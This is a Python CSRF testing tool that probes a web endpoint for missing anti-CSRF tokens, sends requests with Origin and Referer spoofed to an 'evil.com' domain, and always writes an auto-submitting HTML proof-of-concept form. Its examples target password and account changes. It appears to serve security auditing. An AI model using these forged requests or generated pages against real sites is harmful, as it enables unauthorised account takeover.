#!/usr/bin/env python3
"""
Ethical Exploration - Cross-Site Request Forgery (CSRF) Security Tester & PoC Generator
License: GNU General Public License v3.0 (GPL-3.0)
Description: Evaluates HTTP endpoints for CSRF vulnerabilities by testing anti-CSRF tokens,
             Origin/Referer header enforcement, SameSite cookie attributes, and generates HTML PoCs.
"""

import argparse
import html
import json
import os
import sys
import urllib.parse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.parse
    import urllib.error
    HAS_REQUESTS = False


def generate_html_poc(url, method, data_dict, output_file="csrf_poc.html"):
    """Generates an auto-submitting HTML CSRF Proof of Concept form."""
    method_upper = method.upper()
    inputs = []
    for k, v in data_dict.items():
        escaped_k = html.escape(str(k))
        escaped_v = html.escape(str(v))
        inputs.append(f'      <input type="hidden" name="{escaped_k}" value="{escaped_v}" />')

    inputs_html = "\n".join(inputs)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF Proof of Concept</title>
</head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <p>Target: <code>{html.escape(url)}</code></p>
  <form id="csrfForm" action="{html.escape(url)}" method="{method_upper}">
{inputs_html}
    <input type="submit" value="Submit Request" />
  </form>
  <script>
    // Auto-submit on load
    window.addEventListener('DOMContentLoaded', function() {{
      console.log('[*] Triggering automated CSRF payload execution...');
      document.getElementById('csrfForm').submit();
    }});
  </script>
</body>
</html>
"""
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(html_content)
    print(f"[+] CSRF Proof-of-Concept HTML generated: '{output_file}'")
    return output_file


def send_http_request(url, method, data=None, headers=None, cookies=None, timeout=10):
    """Dispatches request via requests or standard urllib."""
    req_headers = {"User-Agent": "Mozilla/5.0 (CSRFAudit/1.0)"}
    if headers:
        req_headers.update(headers)

    if HAS_REQUESTS:
        session = requests.Session()
        if cookies:
            session.cookies.update(cookies)
        if method.upper() == "POST":
            resp = session.post(url, data=data, headers=req_headers, timeout=timeout, allow_redirects=False)
        else:
            resp = session.get(url, params=data, headers=req_headers, timeout=timeout, allow_redirects=False)
        return resp.status_code, resp.headers, resp.text
    else:
        # Fallback to urllib
        if cookies:
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            req_headers["Cookie"] = cookie_str

        if method.upper() == "POST":
            encoded = urllib.parse.urlencode(data or {}).encode("utf-8")
            req = urllib.request.Request(url, data=encoded, headers=req_headers, method="POST")
        else:
            sep = "&" if "?" in url else "?"
            full_url = f"{url}{sep}{urllib.parse.urlencode(data or {})}" if data else url
            req = urllib.request.Request(full_url, headers=req_headers, method="GET")

        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                headers_dict = dict(resp.headers)
                return resp.status, headers_dict, resp.read().decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read().decode("utf-8", errors="ignore")


def test_csrf(url, method="POST", data=None, cookies=None, headers=None, generate_poc=True, poc_file="csrf_poc.html"):
    """Comprehensive CSRF posture analyzer."""
    if data is None:
        data = {}

    print("=" * 60)
    print("  Ethical Exploration - CSRF Vulnerability Assessment")
    print("=" * 60)
    print(f"[*] Target URL : {url}")
    print(f"[*] HTTP Method: {method.upper()}")
    print(f"[*] Form Data  : {json.dumps(data)}")
    print("-" * 60)

    findings = []

    # 1. Check for standard Anti-CSRF token in payload
    token_keys = ["csrf", "token", "_token", "authenticity_token", "nonce", "__requestverificationtoken"]
    found_tokens = [k for k in data.keys() if any(t in k.lower() for t in token_keys)]

    if not found_tokens:
        print("[!] [FINDING] No anti-CSRF token parameter present in request payload.")
        findings.append("Missing anti-CSRF token in parameter list.")
    else:
        print(f"[*] Detected potential anti-CSRF token(s): {', '.join(found_tokens)}")

    # 2. Test Baseline Request (with standard headers)
    try:
        base_status, base_headers, base_body = send_http_request(url, method, data, headers, cookies)
        print(f"[*] Baseline Request -> HTTP {base_status}")
    except Exception as e:
        print(f"[!] Baseline request error: {e}", file=sys.stderr)
        base_status = None

    # 3. Test with Null / Spoofed Origin & Referer headers
    spoofed_headers = headers.copy() if headers else {}
    spoofed_headers["Origin"] = "https://attacker-domain.evil.com"
    spoofed_headers["Referer"] = "https://attacker-domain.evil.com/malicious-page.html"

    try:
        spoof_status, spoof_headers, spoof_body = send_http_request(url, method, data, spoofed_headers, cookies)
        print(f"[*] Spoofed Origin/Referer Request -> HTTP {spoof_status}")

        if spoof_status in (200, 302) and base_status in (200, 302):
            print("[+] [VULNERABILITY] Target accepts requests with arbitrary cross-origin Origin/Referer headers!")
            findings.append("Target does not enforce strict Origin/Referer validation.")
        elif spoof_status in (400, 403):
            print("[-] Target rejected cross-origin Origin/Referer (Strict header check active).")
    except Exception as e:
        print(f"[!] Cross-origin test error: {e}", file=sys.stderr)

    # 4. Generate PoC if requested
    if generate_poc:
        generate_html_poc(url, method, data, poc_file)

    print("=" * 60)
    print("AUDIT SUMMARY:")
    if findings:
        print(f"[!] Found {len(findings)} potential CSRF issue(s):")
        for f in findings:
            print(f"    - {f}")
    else:
        print("[+] No blatant CSRF misconfigurations detected based on heuristic probes.")
    print("=" * 60)

    return findings


def main():
    parser = argparse.ArgumentParser(
        description="Ethical Exploration - CSRF Security Tester & PoC Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 CSRFTester.py -u https://example.com/api/update -d '{"username":"admin","email":"new@test.com"}' -g
  python3 CSRFTester.py -u https://example.com/change-pass -d '{"password":"123"}' -c '{"sessionid":"xyz"}'
"""
    )
    parser.add_argument("-u", "--url", default="https://example.com/update", help="Target endpoint URL")
    parser.add_argument("-m", "--method", default="POST", choices=["POST", "GET"], help="HTTP Method (default: POST)")
    parser.add_argument("-d", "--data", default='{"username": "admin", "password": "password"}', help="JSON string or key=val&key2=val2 form data")
    parser.add_argument("-c", "--cookies", help="JSON string of cookies (e.g. '{\"session\":\"123\"}')")
    parser.add_argument("-g", "--generate-poc", action="store_true", default=True, help="Generate HTML CSRF PoC file")
    parser.add_argument("-o", "--output", default="csrf_poc.html", help="Path for generated HTML PoC")

    args = parser.parse_args()

    # Parse data argument
    data_dict = {}
    if args.data:
        try:
            data_dict = json.loads(args.data)
        except Exception:
            data_dict = dict(urllib.parse.parse_qsl(args.data))

    cookies_dict = {}
    if args.cookies:
        try:
            cookies_dict = json.loads(args.cookies)
        except Exception:
            cookies_dict = dict(urllib.parse.parse_qsl(args.cookies))

    test_csrf(
        url=args.url,
        method=args.method,
        data=data_dict,
        cookies=cookies_dict,
        generate_poc=args.generate_poc,
        poc_file=args.output
    )


if __name__ == "__main__":
    main()
